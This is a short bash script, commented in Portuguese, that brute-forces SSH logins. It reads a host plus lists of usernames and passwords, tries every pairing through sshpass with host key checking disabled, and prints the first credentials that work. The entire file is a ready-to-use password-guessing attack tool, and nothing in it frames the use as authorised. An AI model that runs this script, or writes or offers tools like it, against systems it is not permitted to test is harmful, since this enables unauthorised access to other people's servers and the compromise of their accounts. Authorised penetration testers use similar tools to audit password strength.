#!/bin/bash

# Verifica se o número correto de argumentos foi passado
if [ "$#" -ne 3 ]; then
    echo "Uso: $0 <host> <arquivo_de_usuarios> <arquivo_de_senhas>"
    exit 1
fi

HOST=$1
USERS_FILE=$2
PASSWORDS_FILE=$3

# Verifica se os arquivos de usuários e senhas existem
if [ ! -f "$USERS_FILE" ]; then
    echo "Arquivo de usuários não encontrado: $USERS_FILE"
    exit 2
fi

if [ ! -f "$PASSWORDS_FILE" ]; then
    echo "Arquivo de senhas não encontrado: $PASSWORDS_FILE"
    exit 3
fi

# Função para tentar uma combinação de usuário e senha
try_login() {
    local user=$1
    local password=$2
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$user@$HOST" exit 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "Login bem-sucedido com usuário: $user e senha: $password"
        exit 0
    fi
}

# Loop através dos arquivos de usuários e senhas
while IFS= read -r user; do
    while IFS= read -r password; do
        try_login "$user" "$password"
    done < "$PASSWORDS_FILE"
done < "$USERS_FILE"

echo "Tentativas concluídas. Nenhuma combinação válida encontrada."
